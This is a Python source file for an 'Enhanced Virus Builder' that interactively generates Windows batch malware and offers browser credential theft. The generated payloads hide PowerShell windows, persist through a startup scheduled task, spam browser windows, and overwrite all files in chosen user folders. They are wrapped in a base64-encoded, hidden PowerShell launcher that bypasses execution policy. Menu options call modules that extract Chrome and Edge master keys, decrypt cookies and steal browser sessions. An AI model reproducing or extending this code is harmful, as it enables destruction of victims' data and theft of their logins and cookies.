#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Virus Builder 1.0.2
by VulnerabilityVigilante

This is an enhanced version of the virus builder that integrates all converted functionality.
"""

import os
import base64
import sys
import json
import sqlite3
from datetime import datetime

# Import converted modules
from cookie_graber import BrowserKeyExtractor
from cookie_processor import CookieProcessor
from decrypt_chrome_v20 import ChromeDecryptor
from handle_stealer import HandleStealer
from donpapi_config import DonPAPIConfig
from main_app import MainApp

class VirusBuilder:
    """Enhanced Virus Builder with integrated functionality"""
    
    def __init__(self):
        self.downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
        
        # Initialize converted modules
        self.browser_key_extractor = BrowserKeyExtractor()
        self.cookie_processor = CookieProcessor()
        self.chrome_decryptor = ChromeDecryptor()
        self.handle_stealer = HandleStealer()
        self.donpapi_config = DonPAPIConfig()
        self.main_app = MainApp()
        
        # Database for tracking
        self.db_path = "virus_builder.db"
        self.init_database()
    
    def init_database(self):
        """Initialize database for tracking"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS viruses (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    filename TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    features TEXT,
                    obfuscation_level INTEGER DEFAULT 1
                )
            ''')
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Database initialization error: {e}")
    
    def show_main_menu(self):
        """Show main menu"""
        print("=" * 60)
        print("🚀 Enhanced Virus Builder 1.0.2")
        print("by VulnerabilityVigilante")
        print("=" * 60)
        print()
        print("Available Options:")
        print("1. Build Basic Virus")
        print("2. Build Advanced Virus")
        print("3. Extract Browser Keys")
        print("4. Process Cookies")
        print("5. Decrypt Chrome v20+")
        print("6. Steal Browser Handles")
        print("7. Show Configuration")
        print("8. View Virus History")
        print("9. Exit")
        print()
    
    def build_basic_virus(self):
        """Build basic virus (original functionality)"""
        print("🔨 Building Basic Virus")
        print("-" * 30)
        
        # Get filename
        file_name = input("What would you like to name the virus file? (title only, no extensions) ")
        file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
        
        while file_name_confirmation != 'y' and file_name_confirmation != 'n':
            print("Please enter either y or n")
            file_name = input("What would you like to name the virus file? (title only, no extensions) ")
            file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
        
        if file_name_confirmation == 'y':
            self.create_basic_virus(file_name)
        else:
            while file_name_confirmation != 'y':
                file_name = input("What would you like to name the virus file? (title only, no extensions) ")
                file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
                while file_name_confirmation != 'y' and file_name_confirmation != 'n':
                    print("Please enter either y or n")
                    file_name = input("What would you like to name the virus file? (title only, no extensions) ")
                    file_name_confirmation = input("Are you sure you would like to put '" + file_name + "' as your virus file title? (y/n) ")
            self.create_basic_virus(file_name)
    
    def create_basic_virus(self, file_name):
        """Create basic virus file"""
        file_path = os.path.join(self.downloads_folder, file_name + ".bat")
        
        with open(file_path, "w") as file:
            file.write("cmd /c powershell -Nop -NonI -Nologo -WindowStyle Hidden \"Write-Host\""+ "\n")
            file.write("@echo off \n")
            file.write("schtasks /create /tn \"MyTask\" /tr \"%0\" /sc ONSTART\n")
            file.write(":loop \n")
        
        # Custom Alert Box Option
        customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
        while customAlertBox != 'y' and customAlertBox != 'n':
            print("Please enter either y or n")
            customAlertBox = input("Would you like to add a custom alert box? (y/n) ")
        
        if customAlertBox == 'y':
            alertBody = input("What would you like put as the body of the alert box? ")
            alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
            
            while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
                print("Please enter either y or n")
                alertBody = input("What would you like put as the message of the alert box? ")
                alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
            
            if alertBodyConfirmation == 'y':
                with open(file_path, "a") as file:
                    file.write("echo msgbox ")
                    file.write("\"" + alertBody + "\" > %temp%\\tmp.vbs\n")
                    file.write("start %temp%\\tmp.vbs\n")
            else:
                while alertBodyConfirmation != 'y':
                    alertBody = input("What would you like put as the message of the alert box? ")
                    alertBodyConfirmation = input("Are you sure you would like to put '" + alertBody + "' as your alert message? (y/n) ")
                    while alertBodyConfirmation != 'y' and alertBodyConfirmation != 'n':
                        print("Please enter either y or n")
                        alertBody = input("What would you like put as the message of the alert box? ")
                        alertBodyConfirmation = input("Are you sure you would like to put \"" + alertBody + "\" as your alert message? (y/n) ")
        else:
            print("")
            print("Very well, would you like to run the default message or not have alert boxes?")
            print("1: Default Message")
            print("2: No Alert Boxes")
            alertBoxOption = input("Number: ")
            while alertBoxOption != '1' and alertBoxOption != '2':
                print("Please enter 1 or 2")
                print()
                print("Would you like to run the default message or not have alert boxes?")
                print("1: Default Message")
                print("2: No Alert Boxes")
                alertBoxOption = input("Number: ")
            if alertBoxOption == '1':
                print('Using default message: "Click OK"')
                print()
                with open(file_path, "a") as file:
                    file.write("echo msgbox \"Click OK\" > %temp%\\tmp.vbs\n")
                    file.write("start %temp%\\tmp.vbs\n")
            else:
                print("\nUnderstood. Alert boxes will not be included.")
                print()
        
        # Browser Spam Functionality
        browserOption = input("Would you like to spam webpages? (y/n) ")
        while browserOption != 'y' and browserOption != 'n':
            print("Please enter either y or n")
            browserOption = input("Would you like to spam webpages? (y/n) ")
            print()
        
        if browserOption == 'y':
            webpageAmount = int(input("How many different kinds of websites would you like the virus to open? "))
            web_list = []
            print()
            print("Make sure to format the websites in the following format:")
            print("google.com")
            for i in range(webpageAmount):
                print()
                website = "https://www."
                websiteInput = input("Webpage " + str(i+1) + ": ")
                website += websiteInput
                web_list.append(website)
            
            print()
            print(web_list)
            web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
            while web_confirmation != 'y' and web_confirmation != 'n':
                print("Please enter either y or n")
                print()
                print(web_list)
                web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
            
            while web_confirmation == 'n':
                web_list = []
                print()
                print("Make sure to format the websites in the following format:")
                print("google.com")
                for i in range(webpageAmount):
                    print()
                    website = "https://www."
                    websiteInput = input("Webpage " + str(i + 1) + ": ")
                    website += websiteInput
                    web_list.append(website)
                print()
                print(web_list)
                web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
                while web_confirmation != 'y' and web_confirmation != 'n':
                    print("Please enter either y or n")
                    print()
                    print(web_list)
                    web_confirmation = input("Are you sure you want to use these websites? (y/n) ")
            
            if web_confirmation == 'y':
                with open(file_path, "a") as file:
                    for i in web_list:
                        file.write("explorer ")
                        file.write("\"")
                        file.write(i)
                        file.write("\"\n")
        else:
            print("Understood. No websites will be spammed.")
            print()
        
        # File overwrite functionality
        fileChangeOption = input("\nWould you like to overwrite the files on the victim's PC? (y/n) ")
        while fileChangeOption != 'y' and fileChangeOption != 'n':
            print("Please enter either y or n")
            fileChangeOption = input("\nWould you like to overwrite the files on the victim's PC? (y/n) ")
            print()
        
        if fileChangeOption == 'y':
            message = input("What would you like to put as the message of the file? ")
            message_confirmation = input("Are you sure you would like to put '" + message + "' as your file message? (y/n) ")
            
            while message_confirmation != 'y' and message_confirmation != 'n':
                print("Please enter either y or n")
                message = input("What would you like put as the message of the file? ")
                message_confirmation = input("Are you sure you would like to put '" + message + "' as your file message? (y/n) ")
            
            if message_confirmation == 'y':
                multipleDirectories = input("\nWould you like to change files in multiple directories? (y/n) ")
                while multipleDirectories != 'y' and multipleDirectories != 'n':
                    print("Please enter either y or n")
                    multipleDirectories = input("Would you like to change files in multiple directories? (y/n) ")
                
                if multipleDirectories == 'y':
                    directoryAmount = int(input("How many directories would you like to change files in? "))
                    directory_list = []
                    print()
                    print("Choose from the following options: \n")
                    print("1: Desktop\n")
                    print("2: Documents\n")
                    print("3: Downloads\n")
                    print("4: Pictures\n")
                    print("5: Videos\n")
                    print()
                    
                    for i in range(directoryAmount):
                        directory = input("Directory " + str(i+1) + ": ")
                        if directory == '1':
                            directory = "Desktop"
                        if directory == '2':
                            directory = "Documents"
                        if directory == '3':
                            directory = "Downloads"
                        if directory == '4':
                            directory = "Pictures"
                        if directory == '5':
                            directory = "Videos"
                        directory_list.append(directory)
                    
                    with open(file_path, 'r') as file:
                        lines = file.readlines()
                    
                    for (i, directory) in enumerate(directory_list):
                        lines.insert(2, 'for %%A in ("%USERPROFILE%\\' + directory + '\\*") do (\n')
                        lines.insert(3, '    ren "%%A" "%%~nA.txt"\n')
                        lines.insert(4, '    echo ' + message + ' > "%USERPROFILE%\\' + directory + '\\%%~nA.txt"\n')
                        lines.insert(5, ')\n')
                    
                    with open(file_path, 'w') as file:
                        file.writelines(lines)
                
                if multipleDirectories == 'n':
                    print("Choose from the following options: \n")
                    print("1: Desktop\n")
                    print("2: Documents\n")
                    print("3: Downloads\n")
                    print("4: Pictures\n")
                    print("5: Videos\n")
                    print()
                    
                    directory = input("Which directory would you like to change files in? ")
                    if directory == '1':
                        directory = "Desktop"
                    if directory == '2':
                        directory = "Documents"
                    if directory == '3':
                        directory = "Downloads"
                    if directory == '4':
                        directory = "Pictures"
                    if directory == '5':
                        directory = "Videos"
                    
                    with open(file_path, 'r') as file:
                        lines = file.readlines()
                    
                    lines.insert(2, 'for %%A in ("%USERPROFILE%\\' + directory + '\\*") do (\n')
                    lines.insert(3, '    ren "%%A" "%%~nA.txt"\n')
                    lines.insert(4, '    echo ' + message + ' > "%USERPROFILE%\\' + directory + '\\%%~nA.txt"\n')
                    lines.insert(5, ')\n')
                    
                    with open(file_path, 'w') as file:
                        file.writelines(lines)
        
        if fileChangeOption == 'n':
            print("Understood. No files will be changed.")
            print()
        
        # Finish the virus
        with open(file_path, "a") as file:
            file.write("goto loop\n")
        
        # Encode and create PowerShell wrapper
        self.create_powershell_wrapper(file_path, file_name)
        
        # Save to database
        self.save_virus_to_db(file_name, ["basic_virus", "alert_box", "browser_spam", "file_overwrite"])
        
        print("")
        print("Virus created, check it out at " + file_path)
    
    def create_powershell_wrapper(self, file_path, file_name):
        """Create PowerShell wrapper for the virus"""
        with open(file_path, 'rb') as file:
            file_content = file.read()
        
        encoded_content = base64.b64encode(file_content)
        base64_string = encoded_content.decode('utf-8')
        
        powershell_script = f"""
@echo off
echo powershell.exe -ExecutionPolicy Bypass -File "%~dp0{file_name}" > script.ps1
echo $Base64 = "{base64_string}" >> script.ps1
echo $DecodedBytes = [System.Convert]::FromBase64String($Base64) >> script.ps1
echo $DecodedString = [System.Text.Encoding]::UTF8.GetString($DecodedBytes) >> script.ps1
echo $TempFile = [System.IO.Path]::GetTempFileName() + ".bat" >> script.ps1
echo [System.IO.File]::WriteAllText($TempFile, $DecodedString) >> script.ps1
echo cmd /c $TempFile >> script.ps1
echo Remove-Item $TempFile >> script.ps1
attrib +s +h script.ps1
powershell -ExecutionPolicy Bypass -File "script.ps1"
"""
        
        with open(file_path, 'w') as file:
            file.write(powershell_script)
    
    def save_virus_to_db(self, filename, features):
        """Save virus information to database"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO viruses (filename, features, obfuscation_level)
                VALUES (?, ?, ?)
            ''', (filename, json.dumps(features), 1))
            
            conn.commit()
            conn.close()
        except Exception as e:
            print(f"Database save error: {e}")
    
    def build_advanced_virus(self):
        """Build advanced virus using enhanced builder"""
        print("🔨 Building Advanced Virus")
        print("-" * 30)
        
        try:
            from enhanced_virusBuilder import EnhancedVirusBuilder
            builder = EnhancedVirusBuilder()
            builder.build_virus()
        except ImportError:
            print("Enhanced virus builder not available. Using basic builder.")
            self.build_basic_virus()
        except Exception as e:
            print(f"Error building advanced virus: {e}")
    
    def extract_browser_keys(self):
        """Extract browser master keys"""
        print("🔑 Extracting Browser Master Keys")
        print("-" * 40)
        
        try:
            keys = self.browser_key_extractor.extract_all_keys()
            
            print("\nResults:")
            print(f"Edge key: {'Found' if keys['edge'] else 'Not found'}")
            print(f"Chrome key: {'Found' if keys['chrome'] else 'Not found'}")
            
        except Exception as e:
            print(f"Error extracting keys: {e}")
    
    def process_cookies(self):
        """Process browser cookies"""
        print("🍪 Processing Browser Cookies")
        print("-" * 35)
        
        try:
            db_path = input("Enter cookie database path: ").strip()
            master_key = input("Enter master key: ").strip()
            host_filter = input("Enter host filter (optional): ").strip() or None
            
            if not os.path.exists(db_path):
                print("Database file not found!")
                return
            
            cookies = self.cookie_processor.process_cookies(db_path, master_key, host_filter)
            print(f"\nProcessed {len(cookies)} cookies successfully")
            
        except Exception as e:
            print(f"Error processing cookies: {e}")
    
    def decrypt_chrome_v20(self):
        """Decrypt Chrome v20+ cookies"""
        print("🔓 Decrypting Chrome v20+ Cookies")
        print("-" * 40)
        
        try:
            key_file = input("Enter key file path (or press Enter for default): ").strip()
            if not key_file:
                key_file = "app_bound_encrypted_key.txt"
            
            result = self.chrome_decryptor.decrypt_chrome_key(key_file)
            
            if result:
                print(f"Decrypted key: {result}")
            else:
                print("Failed to decrypt Chrome v20+ cookies")
                
        except Exception as e:
            print(f"Error decrypting Chrome: {e}")
    
    def steal_browser_handles(self):
        """Steal browser handles"""
        print("🕵️ Stealing Browser Handles")
        print("-" * 35)
        
        try:
            success = self.handle_stealer.steal_all_cookies()
            
            if success:
                print("Cookie theft completed successfully!")
            else:
                print("No cookies were stolen.")
                
        except Exception as e:
            print(f"Error stealing handles: {e}")
    
    def show_configuration(self):
        """Show DonPAPI configuration"""
        print("⚙️ DonPAPI Configuration")
        print("-" * 30)
        
        try:
            config = self.donpapi_config.get_config_dict()
            
            print(f"Share: {config['secretsdump']['share']}")
            print(f"Remote Path: {config['secretsdump']['remote_filepath']}")
            print(f"Filename Regex: {config['secretsdump']['filename_regex']}")
            print(f"File Extension: {config['secretsdump']['file_extension']}")
            
            if self.donpapi_config.validate_config():
                print("\n✅ Configuration is valid")
            else:
                print("\n❌ Configuration is invalid")
                
        except Exception as e:
            print(f"Error showing configuration: {e}")
    
    def view_virus_history(self):
        """View virus creation history"""
        print("📝 Virus Creation History")
        print("-" * 30)
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT filename, created_at, features, obfuscation_level
                FROM viruses 
                ORDER BY created_at DESC 
                LIMIT 10
            ''')
            
            viruses = cursor.fetchall()
            conn.close()
            
            if not viruses:
                print("No viruses found in history.")
                return
            
            for i, virus in enumerate(viruses, 1):
                filename, created_at, features, obf_level = virus
                features_list = json.loads(features) if features else []
                
                print(f"{i}. {filename}")
                print(f"   Created: {created_at}")
                print(f"   Features: {', '.join(features_list)}")
                print(f"   Obfuscation: {obf_level}/5")
                print()
                
        except Exception as e:
            print(f"Error viewing history: {e}")
    
    def run(self):
        """Run the virus builder"""
        while True:
            try:
                self.show_main_menu()
                choice = input("Enter your choice (1-9): ").strip()
                
                if choice == "1":
                    self.build_basic_virus()
                elif choice == "2":
                    self.build_advanced_virus()
                elif choice == "3":
                    self.extract_browser_keys()
                elif choice == "4":
                    self.process_cookies()
                elif choice == "5":
                    self.decrypt_chrome_v20()
                elif choice == "6":
                    self.steal_browser_handles()
                elif choice == "7":
                    self.show_configuration()
                elif choice == "8":
                    self.view_virus_history()
                elif choice == "9":
                    print("Exiting Virus Builder...")
                    break
                else:
                    print("Invalid choice. Please enter 1-9.")
                
                input("\nPress Enter to continue...")
                print("\n" + "="*60 + "\n")
                
            except KeyboardInterrupt:
                print("\n\nExiting Virus Builder...")
                break
            except Exception as e:
                print(f"Error: {e}")
                input("\nPress Enter to continue...")

def main():
    """Main entry point"""
    try:
        builder = VirusBuilder()
        builder.run()
    except KeyboardInterrupt:
        print("\n\nExiting Virus Builder...")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()